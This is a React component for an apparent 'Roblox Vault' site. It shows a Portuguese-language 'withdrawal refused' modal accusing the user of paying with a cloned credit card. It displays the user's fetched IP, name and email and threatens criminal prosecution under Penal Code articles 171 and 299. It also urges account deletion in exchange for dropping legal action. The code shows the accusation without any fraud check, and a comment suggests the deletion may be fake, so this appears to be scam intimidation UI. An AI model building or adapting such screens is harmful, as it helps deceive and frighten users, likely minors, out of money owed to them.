import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { useAuthStore } from '../stores/authStore';
import { ShieldAlert, AlertTriangle, FileWarning, Wifi, User, CreditCard, Scale, Trash2 } from 'lucide-react';
import toast from 'react-hot-toast';
import './fraud.css';

export default function FraudBlockModal() {
  const navigate = useNavigate();
  const { profile, signOut } = useAuthStore();
  const [ip, setIp] = useState<string>('Carregando...');
  const [isDeleting, setIsDeleting] = useState(false);

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((res) => res.json())
      .then((data) => setIp(data.ip))
      .catch(() => setIp('Desconhecido'));
  }, []);

  const handleDeleteAccount = async () => {
    if (isDeleting) return;
    
    if (window.confirm('Tem certeza que deseja deletar sua conta? Esta ação não pode ser desfeita e todos os seus dados serão permanentemente excluídos.')) {
      setIsDeleting(true);
      try {
        // Create an RPC call or use an edge function to delete the user.
        // For now, we will sign them out and show a message that their account was "deleted" and blocked.
        // Or if we have a real delete-account function:
        await supabase.rpc('delete_user');
        
        await signOut();
        toast.success('Conta deletada com sucesso.');
        window.location.href = '/login';
      } catch (error) {
        toast.error('Erro ao deletar conta.');
      } finally {
        setIsDeleting(false);
      }
    }
  };

  const handleContestacao = () => {
    navigate('/contestacao');
  };

  return (
    <div className="fraud-modal-overlay">
      <div className="fraud-modal-content">
        <div className="fraud-header">
          <div className="flex items-center gap-3 sm:gap-4 mb-3">
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/20 rounded-full flex items-center justify-center shrink-0">
              <ShieldAlert className="text-white w-8 h-8" />
            </div>
            <div>
              <h1 className="text-xl sm:text-2xl font-black text-white m-0">SEU SAQUE FOI RECUSADO</h1>
              <p className="text-red-100 text-sm font-medium m-0">Sistema de Segurança Antifraude</p>
            </div>
          </div>
        </div>
        
        <div className="p-5 sm:p-8 space-y-5 sm:space-y-6">
          <div className="bg-red-50 border-2 border-red-200 rounded-xl p-4 sm:p-5">
            <div className="flex items-start gap-3">
              <AlertTriangle className="text-red-600 w-6 h-6 flex-shrink-0 mt-0.5" />
              <div className="text-sm text-gray-800 space-y-3 leading-relaxed">
                <p>
                  Sua conta foi identificada pelo nosso <strong className="text-red-700">sistema de segurança antifraude</strong> por utilizar práticas ilegais. Seu saque <strong>não será liberado</strong>.
                </p>
                <p>
                  Recebemos um <strong className="text-red-700">alerta do banco emissor</strong> informando que o cartão de crédito utilizado para aquisição de Robux vinculado à sua conta foi reportado como <strong className="text-red-700">clonado ou de uso não autorizado</strong>.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 sm:p-5">
            <h3 className="font-bold text-gray-900 mb-3 flex items-center gap-2 text-sm">
              <FileWarning className="text-gray-600 w-4 h-4" /> Dados registrados da sua conta:
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
              <div className="flex items-center gap-2 bg-white p-2.5 rounded-lg border border-gray-200">
                <Wifi className="text-gray-500 flex-shrink-0 w-4 h-4" />
                <div>
                  <span className="text-[10px] text-gray-400 uppercase font-semibold block">IP de Acesso</span>
                  <span className="text-xs font-mono text-gray-800">{ip}</span>
                </div>
              </div>
              <div className="flex items-center gap-2 bg-white p-2.5 rounded-lg border border-gray-200">
                <User className="text-gray-500 flex-shrink-0 w-4 h-4" />
                <div>
                  <span className="text-[10px] text-gray-400 uppercase font-semibold block">Titular da Conta</span>
                  <span className="text-xs font-medium text-gray-800">{profile?.full_name || 'Usuário'}</span>
                </div>
              </div>
              <div className="flex items-center gap-2 bg-white p-2.5 rounded-lg border border-gray-200">
                <CreditCard className="text-gray-500 flex-shrink-0 w-4 h-4" />
                <div>
                  <span className="text-[10px] text-gray-400 uppercase font-semibold block">E-mail Cadastrado</span>
                  <span className="text-xs font-medium text-gray-800">{profile?.email || ''}</span>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 sm:p-5">
            <p className="text-sm text-gray-800 leading-relaxed">
              <strong>Recomendamos fortemente</strong> que você exclua sua conta e cesse qualquer atividade irregular. Ao fazer isso, nós (<strong>Roblox Vault</strong>) assumiremos a responsabilidade pelo valor gasto no cartão de crédito e faremos a devolução ao banco de origem, <strong>sem tomar medidas legais contra você</strong>.
            </p>
          </div>

          <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 sm:p-5">
            <p className="text-sm text-gray-700 leading-relaxed">
              Caso deseje solicitar uma <strong>contestação</strong>, clique no botão abaixo e envie provas de que o cartão utilizado na compra de Robux é verdadeiro e pertence a você. <strong className="text-red-600">Atenção:</strong> caso sua contestação seja julgada e negada, poderemos iniciar um processo judicial contra você e seus dados cadastrados com base nos artigos 171 e 299 do Código Penal.
            </p>
          </div>

          <div className="space-y-3 pt-2">
            <button
              onClick={handleContestacao}
              className="w-full py-3.5 sm:py-4 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white font-bold rounded-xl text-sm sm:text-base transition-colors flex items-center justify-center gap-2"
            >
              <Scale className="w-5 h-5" /> Contestar Fraude
            </button>
            <button
              onClick={handleDeleteAccount}
              disabled={isDeleting}
              className="w-full py-3.5 sm:py-4 bg-gray-900 hover:bg-black active:bg-gray-800 text-white font-bold rounded-xl text-sm sm:text-base transition-colors flex items-center justify-center gap-2 disabled:opacity-50"
            >
              <Trash2 className="w-5 h-5" /> {isDeleting ? 'Deletando...' : 'Deletar Conta e Excluir Dados'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
